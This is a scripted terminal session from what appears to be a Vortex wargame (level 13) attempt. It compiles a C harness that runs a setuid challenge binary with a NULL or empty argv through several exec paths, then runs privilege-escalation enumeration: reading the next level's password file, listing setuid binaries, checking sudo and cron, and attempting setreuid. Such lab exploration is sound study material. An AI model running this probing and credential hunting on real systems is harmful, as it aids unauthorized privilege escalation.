@sleep 3
@wait 12 D=$(mktemp -d); cd $D; pwd
@wait 8 echo "--- angle 1: every exec path for argc==0 (exec13.c, typed in vim) ---"
@wait 6 vi exec13.c
@literal i
@line #include <stdio.h>
@line #include <stdlib.h>
@line #include <string.h>
@line #include <unistd.h>
@line #include <fcntl.h>
@line #ifndef AT_EMPTY_PATH
@line #define AT_EMPTY_PATH 0x1000
@line #endif
@line #include <sys/syscall.h>
@line #include <spawn.h>
@line #include <sys/wait.h>
@line extern char **environ;
@line /* exec13: try every exec path against /vortex/vortex13 and report whether
@line    the child reads stdin (i.e. vuln() runs past the argc gate).
@line    usage: exec13 <mode> <stdin-file>
@line    modes: execve (argv=NULL), execven (argv={NULL}), execveat (dirfd+empty),
@line           fexecve (memfd of the binary), posix_spawn (argv={NULL}). */
@line int main(int argc, char **argv) {
@line     if (argc < 3) { fprintf(stderr, "usage: exec13 <mode> <stdin-file>\n"); return 2; }
@line     const char *mode = argv[1];
@line     int st = 0;
@line     int in = open(argv[2], O_RDONLY);
@line     if (in < 0) { perror("open stdin"); return 2; }
@line     int pfd[2];
@line     if (pipe(pfd) < 0) { perror("pipe"); return 2; }
@line     pid_t pid = fork();
@line     if (pid == 0) {
@line         dup2(in, 0);
@line         close(in); close(pfd[0]);
@line         dup2(pfd[1], 2);            /* child's stderr -> the pipe */
@line         dup2(pfd[1], 1);
@line         close(pfd[1]);
@line         char *ev[1] = { NULL };
@line         char *av[1] = { NULL };
@line         char *av1[2] = { NULL, NULL };
@line         if (strcmp(mode, "execve") == 0) {
@line             syscall(SYS_execve, "/vortex/vortex13", NULL, ev);
@line         } else if (strcmp(mode, "execven") == 0) {
@line             syscall(SYS_execve, "/vortex/vortex13", av, ev);
@line         } else if (strcmp(mode, "execven1") == 0) {
@line             syscall(SYS_execve, "/vortex/vortex13", av1, ev);
@line         } else if (strcmp(mode, "execveat") == 0) {
@line             int dfd = open("/vortex", O_RDONLY | O_DIRECTORY);
@line             /* execveat(dfd, "vortex13", NULL argv, NULL env, 0) */
@line             syscall(SYS_execveat, dfd, "vortex13", NULL, ev, 0);
@line         } else if (strcmp(mode, "fexecve") == 0) {
@line             int fd = open("/vortex/vortex13", O_RDONLY);
@line             syscall(SYS_execveat, fd, "", NULL, ev, AT_EMPTY_PATH);
@line         }
@line         _exit(126);                  /* exec failed */
@line     }
@line     if (strcmp(mode, "spawn") == 0) {
@line         posix_spawn_file_actions_t fa;
@line         posix_spawn_file_actions_init(&fa);
@line         posix_spawn_file_actions_adddup2(&fa, in, 0);
@line         posix_spawn_file_actions_adddup2(&fa, pfd[1], 1);
@line         posix_spawn_file_actions_adddup2(&fa, pfd[1], 2);
@line         char *sav[2] = { NULL, NULL };
@line         char *sev[1] = { NULL };
@line         pid_t c;
@line         if (posix_spawn(&c, "/vortex/vortex13", &fa, NULL, sav, sev) != 0) {
@line             printf("posix_spawn failed\n");
@line             return 1;
@line         }
@line         close(in); close(pfd[1]);
@line         waitpid(c, &st, 0);
@line         close(pfd[0]);
@line         printf("mode=spawn exit=%d sig=%d\n",
@line                WIFEXITED(st) ? WEXITSTATUS(st) : -1,
@line                WIFSIGNALED(st) ? WTERMSIG(st) : 0);
@line         return 0;
@line     }
@line     close(pfd[1]);
@line     close(in);
@line     char buf[4096];
@line     ssize_t n;
@line     int got = 0;
@line     while ((n = read(pfd[0], buf, sizeof buf)) > 0) {
@line         if (!got) { printf("child output: "); got = 1; }
@line         for (ssize_t i = 0; i < n; i++)
@line             if (buf[i] >= 32 && buf[i] < 127) putchar(buf[i]);
@line         printf("\n");
@line     }
@line     close(pfd[0]);
@line     waitpid(pid, &st, 0);
@line     printf("mode=%s exit=%d sig=%d\n", mode,
@line            WIFEXITED(st) ? WEXITSTATUS(st) : -1,
@line            WIFSIGNALED(st) ? WTERMSIG(st) : 0);
@line     return 0;
@line }
@literal \x1b
@literal :wq\r
@wait 10 gcc -o exec13 exec13.c
@wait 8 printf "AAAAAAAAAAAAAAAAA" > in.txt
@wait 10 for m in execve execven execven1 execveat fexecve spawn; do ./exec13 $m in.txt; done
@wait 10 for m in execve execven execven1 execveat fexecve spawn; do strace -f -e trace=execve,execveat,read -o sx-$m.txt ./exec13 $m in.txt >/dev/null 2>&1; echo "== $m: $(grep -c "read(0" sx-$m.txt) stdin-reads"; done
@wait 8 uname -r
@wait 8 echo "--- angle 2: host enumeration ---"
@wait 8 ls -la /vortex/
@wait 8 cat /vortex/vortex14.txt 2>&1 | head -1
@wait 12 find / -perm -4000 -o -perm -2000 2>/dev/null | grep -vE "^/proc|^/sys" | head -40
@wait 10 grep -r "vortex14" /etc /home /opt /srv /usr/local 2>/dev/null | head -5
@wait 8 ls -la /var/mail/ 2>&1 | grep -i vortex | head -6
@wait 8 ls /etc/cron.d/ 2>/dev/null
@wait 6 sudo -n true 2>&1 | head -1
@wait 6 python3 -c 'import os; os.setgid(5014); os.setreuid(5014, 5014)'
@wait 8 exit
